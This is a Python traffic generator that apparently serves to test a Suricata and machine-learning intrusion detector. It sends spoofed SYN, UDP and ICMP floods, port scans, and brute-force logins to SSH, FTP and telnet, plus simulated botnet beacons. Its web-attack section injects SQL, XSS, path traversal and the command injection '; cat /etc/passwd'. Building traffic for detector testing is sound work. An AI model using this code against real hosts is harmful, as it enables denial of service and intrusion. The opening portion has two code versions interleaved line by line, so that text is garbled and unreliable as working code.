                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",

        headers = f"GET {url} HTTP/1.1\r\n"            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",

        headers += f"Host: {dst_ip}\r\n"            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",

        headers += f"User-Agent: {user_agent}\r\n"            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"

        headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"        ]

        headers += "Accept-Language: en-US,en;q=0.5\r\n"        

        headers += "Accept-Encoding: gzip, deflate\r\n"        url = random.choice(benign_urls)

        headers += "Connection: keep-alive\r\n"        user_agent = random.choice(user_agents)

                

        if random.random() < 0.3:  # 30% have cookies        # Build realistic HTTP request

            session_id = ''.join(random.choices('abcdef0123456789', k=32))        headers = f"GET {url} HTTP/1.1\r\n"

            headers += f"Cookie: session_id={session_id}; lang=en\r\n"        headers += f"Host: {dst_ip}\r\n"

                headers += f"User-Agent: {user_agent}\r\n"

        headers += "\r\n"        headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"

                headers += "Accept-Language: en-US,en;q=0.5\r\n"

        return IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(headers)        headers += "Accept-Encoding: gzip, deflate\r\n"

            headers += "Connection: keep-alive\r\n"

    def generate_dos_attack(self, target_ip: str = None, count: int = 1000, rate: float = 100.0):        headers += "Upgrade-Insecure-Requests: 1\r\n"

        """Generate Denial of Service attack patterns"""        

        if not target_ip:        # Add some realistic cookies occasionally

            target_ip = random.choice(self.target_ips)        if random.random() < 0.3:

                        session_id = ''.join(random.choices('abcdef0123456789', k=32))

        print(f"{Colors.RED}💥 DoS Attack: {count} packets → {target_ip} at {rate} pps{Colors.END}")            headers += f"Cookie: session_id={session_id}; lang=en\r\n"

                

        for i in range(count):        headers += "\r\n"

            if not self.running:        

                break        packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(headers)

                        return packet

            src_ip = random.choice(self.source_ips[30:])  # External IPs    

            attack_type = random.choice(['syn_flood', 'udp_flood', 'icmp_flood', 'tcp_rst'])    def generate_dos_attack(self, target_ip: str = None, count: int = 1000, rate: float = 100.0):

                    """Generate Denial of Service attack patterns"""

            if attack_type == 'syn_flood':        if not target_ip:

                packet = IP(src=src_ip, dst=target_ip)/TCP(            target_ip = random.choice(self.target_ips)

                    sport=random.randint(1024, 65535),            

                    dport=random.choice([80, 443, 22, 21]),        print(f"{Colors.RED}💥 Generating DoS attack: {count} packets → {target_ip} at {rate} pps{Colors.END}")

                    flags='S', seq=random.randint(1, 4294967295)        

                )        src_ip = random.choice(self.source_ips[20:])  # Use external IPs

            elif attack_type == 'udp_flood':        

                packet = IP(src=src_ip, dst=target_ip)/UDP(        for i in range(count):

                    sport=random.randint(1024, 65535),            if not self.running:

                    dport=random.randint(1, 65535)                break

                )/Raw(RandString(random.randint(64, 1024)))                

            elif attack_type == 'icmp_flood':            # Different DoS techniques

                packet = IP(src=src_ip, dst=target_ip)/ICMP(type=8, code=0)/Raw(RandString(random.randint(56, 1024)))            attack_type = random.choice(['syn_flood', 'udp_flood', 'icmp_flood', 'tcp_rst'])

            else:  # tcp_rst            

                packet = IP(src=src_ip, dst=target_ip)/TCP(            if attack_type == 'syn_flood':

                    sport=random.randint(1024, 65535),                packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), 

                    dport=random.choice([80, 443, 22]),                                                          dport=random.choice([80, 443, 22, 21]), 

                    flags='R', seq=random.randint(1, 4294967295)                                                          flags='S', seq=random.randint(1, 4294967295))

                )            elif attack_type == 'udp_flood':

                            packet = IP(src=src_ip, dst=target_ip)/UDP(sport=random.randint(1024, 65535), 

            try:                                                          dport=random.randint(1, 65535))/Raw(RandString(random.randint(64, 1024)))

                send(packet, iface=self.interface, verbose=0)            elif attack_type == 'icmp_flood':

                self.packets_sent += 1                packet = IP(src=src_ip, dst=target_ip)/ICMP(type=8, code=0)/Raw(RandString(random.randint(56, 1024)))

                self.attack_stats['DoS'] += 1            else:  # tcp_rst

                                packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), 

                if rate > 0:                                                          dport=random.choice([80, 443, 22]), 

                    time.sleep(1.0 / rate)                                                          flags='R', seq=random.randint(1, 4294967295))

                                

            except Exception as e:            try:

                print(f"{Colors.YELLOW}⚠️ Error sending DoS packet: {e}{Colors.END}")                send(packet, iface=self.interface, verbose=0)

                    self.packets_sent += 1

    def generate_mixed_traffic(self, duration: int = 300, total_rate: float = 50.0):                self.attack_stats['DoS'] += 1

        """Generate mixed traffic with realistic distribution"""                

        traffic_mix = {                if rate > 0:

            'BENIGN': 0.4,           # 40% benign traffic                    time.sleep(1.0 / rate)

            'DoS': 0.15,             # 15% DoS attacks                    

            'DDoS': 0.1,             # 10% DDoS attacks            except Exception as e:

            'RECONNAISSANCE': 0.15,   # 15% reconnaissance                print(f"{Colors.YELLOW}⚠️ Error sending DoS packet: {e}{Colors.END}")

            'BRUTE_FORCE': 0.08,     # 8% brute force    

            'BOTNET': 0.07,          # 7% botnet    def generate_ddos_attack(self, target_ip: str = None, count: int = 2000, rate: float = 200.0):

            'WEB_ATTACK': 0.05       # 5% web attacks        """Generate Distributed Denial of Service attack"""

        }        if not target_ip:

                    target_ip = random.choice(self.target_ips)

        return self._execute_traffic_pattern(traffic_mix, duration, total_rate, "Mixed")            

            print(f"{Colors.RED}🌊 Generating DDoS attack: {count} packets → {target_ip} from multiple sources{Colors.END}")

    def generate_attack_only_traffic(self, duration: int = 300, total_rate: float = 50.0):        

        """Generate attack-only traffic"""        for i in range(count):

        attack_mix = {            if not self.running:

            'BENIGN': 0.0,           # 0% benign                break

            'DoS': 0.25,             # 25% DoS                

            'DDoS': 0.20,            # 20% DDoS            # Use different source IPs to simulate distributed attack

            'RECONNAISSANCE': 0.20,   # 20% reconnaissance            src_ip = random.choice(self.source_ips[30:])  # Use external attack IPs

            'BRUTE_FORCE': 0.15,     # 15% brute force            

            'BOTNET': 0.12,          # 12% botnet            # Mix of attack types

            'WEB_ATTACK': 0.08       # 8% web attacks            attack_type = random.choice(['syn_flood', 'udp_flood', 'http_flood'])

        }            

                    if attack_type == 'syn_flood':

        return self._execute_traffic_pattern(attack_mix, duration, total_rate, "Attack-Only")                packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), 

                                                              dport=80, flags='S', 

    def generate_benign_only_traffic(self, duration: int = 300, total_rate: float = 50.0):                                                          seq=random.randint(1, 4294967295))

        """Generate benign-only traffic for baseline"""            elif attack_type == 'udp_flood':

        benign_mix = {                packet = IP(src=src_ip, dst=target_ip)/UDP(sport=random.randint(1024, 65535), 

            'BENIGN': 1.0,           # 100% benign                                                          dport=53)/Raw(RandString(random.randint(100, 500)))

            'DoS': 0.0, 'DDoS': 0.0, 'RECONNAISSANCE': 0.0,            else:  # http_flood

            'BRUTE_FORCE': 0.0, 'BOTNET': 0.0, 'WEB_ATTACK': 0.0                packet = self._create_http_request(src_ip, target_ip, method='GET', url='/')

        }            

                    try:

        return self._execute_traffic_pattern(benign_mix, duration, total_rate, "Benign-Only")                send(packet, iface=self.interface, verbose=0)

                    self.packets_sent += 1

    def _execute_traffic_pattern(self, traffic_mix: Dict[str, float], duration: int,                 self.attack_stats['DDoS'] += 1

                                total_rate: float, pattern_name: str):                

        """Execute traffic pattern with monitoring"""                if rate > 0:

        print(f"{Colors.BOLD}{Colors.BLUE}🎯 {pattern_name} Traffic Generation{Colors.END}")                    time.sleep(1.0 / rate)

        print(f"Duration: {duration}s, Rate: {total_rate} pps")                    

                    except Exception as e:

        self.running = True                print(f"{Colors.YELLOW}⚠️ Error sending DDoS packet: {e}{Colors.END}")

        self.start_time = time.time()    

            def generate_reconnaissance_attack(self, target_network: str = None, count: int = 500):

        # Calculate packet distribution        """Generate reconnaissance/scanning attack patterns"""

        total_packets = int(duration * total_rate)        if not target_network:

        packets_per_type = {k: int(v * total_packets) for k, v in traffic_mix.items()}            targets = self.target_ips[:20]

                else:

        print(f"\n{Colors.CYAN}📊 Traffic Distribution:{Colors.END}")            targets = list(ipaddress.IPv4Network(target_network).hosts())[:20]

        for attack_type, count in packets_per_type.items():            

            if count > 0:        print(f"{Colors.MAGENTA}🔍 Generating reconnaissance scan: {count} probes across {len(targets)} targets{Colors.END}")

                percentage = (count / total_packets) * 100        

                color = Colors.GREEN if attack_type == 'BENIGN' else Colors.RED        src_ip = random.choice(self.source_ips[25:])  # External attacker

                print(f"  {color}{attack_type}: {count:,} packets ({percentage:.1f}%){Colors.END}")        

                for i in range(count):

        # Start traffic generators            if not self.running:

        threads = []                break

        if packets_per_type['BENIGN'] > 0:                

            t = threading.Thread(target=self.generate_benign_traffic,            target_ip = random.choice(targets)

                               args=(packets_per_type['BENIGN'], total_rate * traffic_mix['BENIGN']))            scan_type = random.choice(['port_scan', 'syn_scan', 'udp_scan', 'os_fingerprint'])

            threads.append(('BENIGN', t))            

                    if scan_type == 'port_scan':

        if packets_per_type['DoS'] > 0:                # Sequential port scanning

            t = threading.Thread(target=self.generate_dos_attack,                port = self.common_ports[i % len(self.common_ports)]

                               args=(None, packets_per_type['DoS'], total_rate * traffic_mix['DoS']))                packet = IP(src=src_ip, dst=str(target_ip))/TCP(sport=random.randint(1024, 65535), 

            threads.append(('DoS', t))                                                              dport=port, flags='S')

                    elif scan_type == 'syn_scan':

        # Start all threads                packet = IP(src=src_ip, dst=str(target_ip))/TCP(sport=random.randint(1024, 65535), 

        for name, thread in threads:                                                              dport=random.choice(self.common_ports), flags='S')

            print(f"  Starting {name} generator...")            elif scan_type == 'udp_scan':

            thread.start()                packet = IP(src=src_ip, dst=str(target_ip))/UDP(sport=random.randint(1024, 65535), 

            time.sleep(0.5)                                                              dport=random.choice([53, 161, 123, 69]))

                    else:  # os_fingerprint

        # Monitor progress                # OS fingerprinting attempt

        monitor_interval = min(30, duration // 10)                packet = IP(src=src_ip, dst=str(target_ip))/TCP(sport=random.randint(1024, 65535), 

        while time.time() - self.start_time < duration:                                                              dport=80, flags='S', 

            elapsed = time.time() - self.start_time                                                              options=[('MSS', 1460), ('NOP', None), ('WScale', 7)])

            remaining = duration - elapsed            

            rate = self.packets_sent / elapsed if elapsed > 0 else 0            try:

                            send(packet, iface=self.interface, verbose=0)

            print(f"\n{Colors.CYAN}📊 Progress: {elapsed:.1f}s/{duration}s ({remaining:.1f}s left){Colors.END}")                self.packets_sent += 1

            print(f"  Packets: {self.packets_sent:,} sent ({rate:.1f} pps)")                self.attack_stats['RECONNAISSANCE'] += 1

                            time.sleep(0.1)  # Slower scanning rate

            # Show live stats                

            total_attacks = sum(self.attack_stats.values())            except Exception as e:

            if total_attacks > 0:                print(f"{Colors.YELLOW}⚠️ Error sending recon packet: {e}{Colors.END}")

                for attack_type, count in self.attack_stats.items():    

                    if count > 0:    def generate_brute_force_attack(self, target_ip: str = None, count: int = 200):

                        percentage = (count / total_attacks) * 100        """Generate brute force authentication attacks"""

                        color = Colors.GREEN if attack_type == 'BENIGN' else Colors.RED        if not target_ip:

                        print(f"    {color}{attack_type}: {count:,} ({percentage:.1f}%){Colors.END}")            target_ip = random.choice(self.target_ips)

                        

            time.sleep(monitor_interval)        print(f"{Colors.YELLOW}🔐 Generating brute force attack: {count} attempts → {target_ip}{Colors.END}")

                

        # Stop traffic generation        src_ip = random.choice(self.source_ips[20:])

        print(f"\n{Colors.YELLOW}⏹️ Stopping {pattern_name} traffic generation...{Colors.END}")        

        self.running = False        for i in range(count):

        for name, thread in threads:            if not self.running:

            thread.join(timeout=5)                break

                        

        self._print_final_stats()            service = random.choice(['ssh', 'ftp', 'http_login', 'telnet'])

        return True            username, password = random.choice(self.common_credentials)

                

    def _print_final_stats(self):            if service == 'ssh':

        """Print final generation statistics"""                # SSH brute force attempt

        elapsed = time.time() - self.start_time if self.start_time else 1                packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), 

                                                                  dport=22, flags='PA')/Raw(f"SSH-2.0-OpenSSH_7.4\r\n")

        print(f"\n{Colors.BOLD}📊 Traffic Generation Summary{Colors.END}")            elif service == 'ftp':

        print(f"Total packets sent: {self.packets_sent:,}")                packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), 

        print(f"Duration: {elapsed:.1f} seconds")                                                          dport=21, flags='PA')/Raw(f"USER {username}\r\n")

        print(f"Average rate: {self.packets_sent/elapsed:.1f} pps")            elif service == 'http_login':

        print(f"Attack type breakdown:")                login_data = f"username={username}&password={password}"

                        packet = self._create_http_request(src_ip, target_ip, method='POST', 

        total_attacks = sum(self.attack_stats.values())                                                 url='/login', data=login_data)

        for attack_type, count in self.attack_stats.items():            else:  # telnet

            if count > 0:                packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), 

                percentage = (count / total_attacks) * 100 if total_attacks > 0 else 0                                                          dport=23, flags='PA')/Raw(f"{username}\r\n")

                color = Colors.GREEN if attack_type == 'BENIGN' else Colors.RED            

                print(f"  {color}{attack_type}: {count:,} ({percentage:.1f}%){Colors.END}")            try:

                        send(packet, iface=self.interface, verbose=0)

        print(f"\n{Colors.CYAN}🎯 Ready for Adaptive Ensemble ML Testing{Colors.END}")                self.packets_sent += 1

        print("Generated traffic patterns will test:")                self.attack_stats['BRUTE_FORCE'] += 1

        print("- Suricata rule-based detection")                time.sleep(0.5)  # Realistic brute force timing

        print("- ML Adaptive Ensemble predictions (RF2017+LGB2018)")                

        print("- Combined threat scoring (0.9148 accuracy)")            except Exception as e:

                print(f"{Colors.YELLOW}⚠️ Error sending brute force packet: {e}{Colors.END}")

def main():    

    parser = argparse.ArgumentParser(    def generate_botnet_traffic(self, count: int = 300):

        description="Enhanced Attack Traffic Generator for ML IDS Testing",        """Generate botnet command & control traffic"""

        formatter_class=argparse.RawDescriptionHelpFormatter,        print(f"{Colors.CYAN}🤖 Generating botnet C&C traffic: {count} communications{Colors.END}")

        epilog="""        

Traffic Modes:        for i in range(count):

  benign     - Generate only legitimate network traffic (100% benign)            if not self.running:

  mixed      - Generate realistic mix of benign and attack traffic (40% benign, 60% attacks)                 break

  attacks    - Generate only attack traffic (100% malicious)                

  flood      - Generate flood of specific attack type            # Bot connecting to C&C server

            bot_ip = random.choice(self.source_ips[:15])  # Internal compromised hosts

Examples:            c2_domain = random.choice(self.botnet_domains)

  # Mixed traffic for 5 minutes at 100 pps            c2_ip = f"185.220.100.{random.randint(1, 254)}"  # Simulate external C&C

  sudo python3 advanced_attack_generator.py --mode mixed --duration 300 --rate 100            

              traffic_type = random.choice(['dns_query', 'http_beacon', 'encrypted_comm'])

  # Benign traffic only for baseline testing            

  sudo python3 advanced_attack_generator.py --mode benign --duration 600 --rate 50            if traffic_type == 'dns_query':

                  # DNS query to C&C domain

  # Attack-only traffic for ML training                packet = IP(src=bot_ip, dst="8.8.8.8")/UDP(sport=random.randint(1024, 65535), 

  sudo python3 advanced_attack_generator.py --mode attacks --duration 300 --rate 200                                                          dport=53)/DNS(qd=DNSQR(qname=c2_domain))

        """            elif traffic_type == 'http_beacon':

    )                # HTTP beacon to C&C

                    packet = self._create_http_request(bot_ip, c2_ip, method='GET', 

    parser.add_argument("--interface", "-i", default="enp2s0", help="Network interface")                                                 url=f'/beacon/{random.randint(1000, 9999)}')

    parser.add_argument("--target-network", "-t", default="192.168.1.0/24", help="Target network range")            else:  # encrypted_comm

    parser.add_argument("--mode", "-m", choices=['mixed', 'benign', 'attacks', 'flood'],                 # Encrypted communication on random port

                       default='mixed', help="Traffic generation mode")                packet = IP(src=bot_ip, dst=c2_ip)/TCP(sport=random.randint(1024, 65535), 

    parser.add_argument("--duration", "-d", type=int, default=300, help="Duration in seconds")                                                      dport=random.randint(8000, 9000), 

    parser.add_argument("--rate", "-r", type=float, default=50.0, help="Packet rate (pps)")                                                      flags='PA')/Raw(RandString(random.randint(50, 200)))

    parser.add_argument("--attack-type", "-a",             

                       choices=['DoS', 'DDoS', 'RECONNAISSANCE', 'BRUTE_FORCE', 'BOTNET', 'WEB_ATTACK'],            try:

                       help="Attack type for flood mode")                send(packet, iface=self.interface, verbose=0)

    parser.add_argument("--dry-run", action="store_true", help="Show config without sending packets")                self.packets_sent += 1

    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")                self.attack_stats['BOTNET'] += 1

                    time.sleep(random.uniform(2, 10))  # Irregular beacon intervals

    args = parser.parse_args()                

                except Exception as e:

    # Validate arguments                print(f"{Colors.YELLOW}⚠️ Error sending botnet packet: {e}{Colors.END}")

    if args.mode == 'flood' and not args.attack_type:    

        print(f"{Colors.RED}❌ --attack-type required for flood mode{Colors.END}")    def generate_web_attack(self, target_ip: str = None, count: int = 150):

        sys.exit(1)        """Generate web application attacks (SQL injection, XSS, etc.)"""

            if not target_ip:

    # Check root privileges (unless dry-run)            target_ip = random.choice(self.target_ips)

    if not args.dry_run and os.geteuid() != 0:            

        print(f"{Colors.RED}❌ Root privileges required for packet injection{Colors.END}")        print(f"{Colors.RED}🌐 Generating web attacks: {count} malicious requests → {target_ip}{Colors.END}")

        print("Run: sudo python3 advanced_attack_generator.py")        

        sys.exit(1)        src_ip = random.choice(self.source_ips[25:])

            

    # Display configuration        for i in range(count):

    print(f"{Colors.BOLD}🚀 Enhanced Attack Traffic Generator{Colors.END}")            if not self.running:

    print(f"Mode: {Colors.YELLOW}{args.mode.upper()}{Colors.END}")                break

    print(f"Interface: {args.interface}")                

    print(f"Target Network: {args.target_network}")            attack_type = random.choice(['sql_injection', 'xss', 'path_traversal', 'command_injection'])

    print(f"Duration: {args.duration}s, Rate: {args.rate} pps")            

    if args.attack_type:            if attack_type == 'sql_injection':

        print(f"Attack Type: {Colors.RED}{args.attack_type}{Colors.END}")                payload = random.choice(self.sql_injection_payloads)

                    url = f"/login.php?username={payload}&password=test"

    if args.dry_run:                packet = self._create_http_request(src_ip, target_ip, method='GET', url=url)

        print(f"\n{Colors.YELLOW}🔍 DRY RUN - Configuration validated!{Colors.END}")                

        return            elif attack_type == 'xss':

                    payload = random.choice(self.xss_payloads)

    # Initialize generator                url = f"/search.php?q={payload}"

    generator = EnhancedTrafficGenerator(args.interface, args.target_network)                packet = self._create_http_request(src_ip, target_ip, method='GET', url=url)

                    

    try:            elif attack_type == 'path_traversal':

        print(f"\n{Colors.GREEN}🎯 Starting traffic generation...{Colors.END}")                payload = "../" * random.randint(3, 8) + "etc/passwd"

        print("Press Ctrl+C to stop gracefully")                url = f"/download.php?file={payload}"

                        packet = self._create_http_request(src_ip, target_ip, method='GET', url=url)

        if args.mode == 'mixed':                

            generator.generate_mixed_traffic(args.duration, args.rate)            else:  # command_injection

        elif args.mode == 'benign':                payload = f"; cat /etc/passwd; echo {random.randint(1000, 9999)}"

            generator.generate_benign_only_traffic(args.duration, args.rate)                data = f"cmd={payload}"

        elif args.mode == 'attacks':                packet = self._create_http_request(src_ip, target_ip, method='POST', 

            generator.generate_attack_only_traffic(args.duration, args.rate)                                                 url='/execute.php', data=data)

        elif args.mode == 'flood':            

            print(f"Flood mode for {args.attack_type} not fully implemented in this version")            try:

                            send(packet, iface=self.interface, verbose=0)

    except KeyboardInterrupt:                self.packets_sent += 1

        print(f"\n{Colors.YELLOW}⏹️ Traffic generation stopped by user{Colors.END}")                self.attack_stats['WEB_ATTACK'] += 1

        generator.running = False                time.sleep(random.uniform(0.5, 2.0))

    except Exception as e:                

        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")            except Exception as e:

        if args.verbose:                print(f"{Colors.YELLOW}⚠️ Error sending web attack packet: {e}{Colors.END}")

            import traceback    

            traceback.print_exc()    def _create_http_request(self, src_ip: str, dst_ip: str, method: str = 'GET', 

                           url: str = '/', data: str = None) -> Packet:

if __name__ == "__main__":        """Create HTTP request packet"""

    main()        sport = random.randint(1024, 65535)
        
        # HTTP headers
        headers = f"{method} {url} HTTP/1.1\r\n"
        headers += f"Host: {dst_ip}\r\n"
        headers += f"User-Agent: Mozilla/5.0 (compatible; AttackBot/1.0)\r\n"
        headers += "Connection: close\r\n"
        
        if data and method == 'POST':
            headers += f"Content-Length: {len(data)}\r\n"
            headers += "Content-Type: application/x-www-form-urlencoded\r\n"
            headers += "\r\n"
            headers += data
        else:
            headers += "\r\n"
        
        packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(headers)
        return packet
    
    def generate_mixed_traffic(self, duration: int = 300, total_rate: float = 50.0):
        """Generate mixed traffic pattern with all attack types"""
        print(f"{Colors.BOLD}{Colors.BLUE}🎯 Generating mixed attack traffic for {duration} seconds{Colors.END}")
        print(f"Total packet rate: {total_rate} pps")
        
        # Traffic distribution - realistic mix
        traffic_mix = {
            'BENIGN': 0.4,      # 40% benign - realistic baseline
            'DoS': 0.15,        # 15% DoS - high impact attacks
            'DDoS': 0.1,        # 10% DDoS - distributed attacks
            'RECONNAISSANCE': 0.15,  # 15% recon - common attack vector
            'BRUTE_FORCE': 0.08,     # 8% brute force - credential attacks
            'BOTNET': 0.07,          # 7% botnet - persistent threats
            'WEB_ATTACK': 0.05       # 5% web attacks - application layer
        }
        
        return self._execute_traffic_pattern(traffic_mix, duration, total_rate, "Mixed")
    
    def generate_attack_only_traffic(self, duration: int = 300, total_rate: float = 50.0):
        """Generate attack-only traffic without benign baseline"""
        print(f"{Colors.BOLD}{Colors.RED}⚔️ Generating ATTACK-ONLY traffic for {duration} seconds{Colors.END}")
        print(f"Total packet rate: {total_rate} pps (100% malicious)")
        
        # Attack-only distribution - no benign traffic
        attack_mix = {
            'BENIGN': 0.0,           # 0% benign - pure attack traffic
            'DoS': 0.25,             # 25% DoS
            'DDoS': 0.20,            # 20% DDoS
            'RECONNAISSANCE': 0.20,   # 20% recon
            'BRUTE_FORCE': 0.15,     # 15% brute force
            'BOTNET': 0.12,          # 12% botnet
            'WEB_ATTACK': 0.08       # 8% web attacks
        }
        
        return self._execute_traffic_pattern(attack_mix, duration, total_rate, "Attack-Only")
    
    def generate_benign_only_traffic(self, duration: int = 300, total_rate: float = 50.0):
        """Generate only benign traffic for baseline testing"""
        print(f"{Colors.BOLD}{Colors.GREEN}🌐 Generating BENIGN-ONLY traffic for {duration} seconds{Colors.END}")
        print(f"Total packet rate: {total_rate} pps (100% legitimate)")
        
        # Benign-only traffic
        benign_mix = {
            'BENIGN': 1.0,      # 100% benign
            'DoS': 0.0,         # 0% attacks
            'DDoS': 0.0,
            'RECONNAISSANCE': 0.0,
            'BRUTE_FORCE': 0.0,
            'BOTNET': 0.0,
            'WEB_ATTACK': 0.0
        }
        
        return self._execute_traffic_pattern(benign_mix, duration, total_rate, "Benign-Only")
    
    def _execute_traffic_pattern(self, traffic_mix: Dict[str, float], duration: int, 
                                total_rate: float, pattern_name: str):
        """Execute a specific traffic pattern with given distribution"""
        self.running = True
        start_time = time.time()
        
        # Calculate packets per attack type
        total_packets = int(duration * total_rate)
        packets_per_type = {k: int(v * total_packets) for k, v in traffic_mix.items()}
        
        print(f"\n{Colors.CYAN}📊 {pattern_name} Traffic Distribution:{Colors.END}")
        for attack_type, count in packets_per_type.items():
            if count > 0:
                percentage = (count / total_packets) * 100
                color = Colors.GREEN if attack_type == 'BENIGN' else Colors.RED
                print(f"  {color}{attack_type}: {count} packets ({percentage:.1f}%){Colors.END}")
        print()
        
        # Start attack threads
        threads = []
        
        # Only start threads for attack types with packets > 0
        if packets_per_type['BENIGN'] > 0:
            t = threading.Thread(target=self.generate_benign_traffic, 
                               args=(packets_per_type['BENIGN'], total_rate * traffic_mix['BENIGN']))
            threads.append(('BENIGN', t))
        
        if packets_per_type['DoS'] > 0:
            t = threading.Thread(target=self.generate_dos_attack, 
                               args=(None, packets_per_type['DoS'], total_rate * traffic_mix['DoS']))
            threads.append(('DoS', t))
        
        if packets_per_type['DDoS'] > 0:
            t = threading.Thread(target=self.generate_ddos_attack, 
                               args=(None, packets_per_type['DDoS'], total_rate * traffic_mix['DDoS']))
            threads.append(('DDoS', t))
        
        if packets_per_type['RECONNAISSANCE'] > 0:
            t = threading.Thread(target=self.generate_reconnaissance_attack, 
                               args=(None, packets_per_type['RECONNAISSANCE']))
            threads.append(('RECONNAISSANCE', t))
        
        if packets_per_type['BRUTE_FORCE'] > 0:
            t = threading.Thread(target=self.generate_brute_force_attack, 
                               args=(None, packets_per_type['BRUTE_FORCE']))
            threads.append(('BRUTE_FORCE', t))
        
        if packets_per_type['BOTNET'] > 0:
            t = threading.Thread(target=self.generate_botnet_traffic, 
                               args=(packets_per_type['BOTNET'],))
            threads.append(('BOTNET', t))
        
        if packets_per_type['WEB_ATTACK'] > 0:
            t = threading.Thread(target=self.generate_web_attack, 
                               args=(None, packets_per_type['WEB_ATTACK']))
            threads.append(('WEB_ATTACK', t))
        
        # Start all threads with staggered timing
        print(f"{Colors.YELLOW}🚀 Starting {len(threads)} traffic generators...{Colors.END}")
        for attack_type, thread in threads:
            print(f"  Starting {attack_type} generator...")
            thread.start()
            time.sleep(1)  # Stagger starts to avoid resource contention
        
        # Enhanced monitoring with better progress tracking
        monitor_interval = min(30, duration // 10)  # Adaptive monitoring interval
        last_packet_count = 0
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            packets_rate = self.packets_sent / elapsed if elapsed > 0 else 0
            
            # Calculate current rate (packets since last check)
            current_packets = self.packets_sent - last_packet_count
            current_rate = current_packets / monitor_interval if monitor_interval > 0 else 0
            last_packet_count = self.packets_sent
            
            print(f"\n{Colors.CYAN}📊 {pattern_name} Progress:{Colors.END}")
            print(f"  Time: {elapsed:.1f}s / {duration}s ({remaining:.1f}s remaining)")
            print(f"  Packets: {self.packets_sent:,} sent ({packets_rate:.1f} avg pps, {current_rate:.1f} current pps)")
            
            # Show live attack type distribution
            total_attacks = sum(self.attack_stats.values())
            if total_attacks > 0:
                print(f"  Live Attack Distribution:")
                for attack_type, count in self.attack_stats.items():
                    if count > 0:
                        percentage = (count / total_attacks) * 100
                        color = Colors.GREEN if attack_type == 'BENIGN' else Colors.RED
                        print(f"    {color}{attack_type}: {count:,} ({percentage:.1f}%){Colors.END}")
            
            # Check thread health
            active_threads = sum(1 for _, t in threads if t.is_alive())
            if active_threads < len(threads):
                print(f"  {Colors.YELLOW}⚠️ {active_threads}/{len(threads)} generators active{Colors.END}")
            
            time.sleep(monitor_interval)
        
        # Stop all traffic generation
        print(f"\n{Colors.YELLOW}⏹️ Stopping {pattern_name} traffic generation...{Colors.END}")
        self.running = False
        
        # Wait for threads to complete with timeout
        for attack_type, thread in threads:
            thread.join(timeout=5)
            if thread.is_alive():
                print(f"  {Colors.YELLOW}⚠️ {attack_type} generator did not stop cleanly{Colors.END}")
        
        print(f"{Colors.GREEN}✅ {pattern_name} traffic generation completed{Colors.END}")
        self._print_final_stats()
        
        return True
    
    def generate_attack_flood(self, attack_type: str, duration: int = 60, rate: float = 100.0):
        """Generate flood of specific attack type for testing"""
        print(f"{Colors.RED}🌊 Generating {attack_type} flood for {duration} seconds at {rate} pps{Colors.END}")
        
        self.running = True
        start_time = time.time()
        
        target_ip = random.choice(self.target_ips)
        count = int(duration * rate)
        
        if attack_type.upper() == 'DOS':
            self.generate_dos_attack(target_ip, count, rate)
        elif attack_type.upper() == 'DDOS':
            self.generate_ddos_attack(target_ip, count, rate)
        elif attack_type.upper() == 'RECONNAISSANCE':
            self.generate_reconnaissance_attack(None, count)
        elif attack_type.upper() == 'BRUTE_FORCE':
            self.generate_brute_force_attack(target_ip, count)
        elif attack_type.upper() == 'BOTNET':
            self.generate_botnet_traffic(count)
        elif attack_type.upper() == 'WEB_ATTACK':
            self.generate_web_attack(target_ip, count)
        else:
            print(f"{Colors.RED}❌ Unknown attack type: {attack_type}{Colors.END}")
            return
        
        self.running = False
        self._print_final_stats()
    
    def _print_final_stats(self):
        """Print final generation statistics"""
        print(f"\n{Colors.BOLD}📊 Attack Generation Summary{Colors.END}")
        print(f"Total packets sent: {self.packets_sent}")
        print(f"Attack type breakdown:")
        
        total_attacks = sum(self.attack_stats.values())
        for attack_type, count in self.attack_stats.items():
            percentage = (count / total_attacks) * 100 if total_attacks > 0 else 0
            color = Colors.GREEN if attack_type == 'BENIGN' else Colors.RED
            print(f"  {color}{attack_type}: {count} ({percentage:.1f}%){Colors.END}")
        
        print(f"\n{Colors.CYAN}🎯 Adaptive Ensemble ML Testing Ready{Colors.END}")
        print("Generated traffic patterns should trigger various ML predictions:")
        print("- Check Suricata eve.json for rule-based detections")
        print("- Monitor ML pipeline for Adaptive Ensemble predictions (RF2017+LGB2018)")
        print("- Analyze combined threat scoring results with 0.9148 accuracy ensemble")

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Attack Traffic Generator for ML IDS Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Traffic Modes:
  benign     - Generate only legitimate network traffic (100% benign)
  mixed      - Generate realistic mix of benign and attack traffic (40% benign, 60% attacks)
  attacks    - Generate only attack traffic (100% malicious)
  flood      - Generate flood of specific attack type

Attack Types (for flood mode):
  DoS            - Denial of Service attacks (SYN flood, UDP flood)
  DDoS           - Distributed Denial of Service from multiple sources
  RECONNAISSANCE - Port scanning and network probing
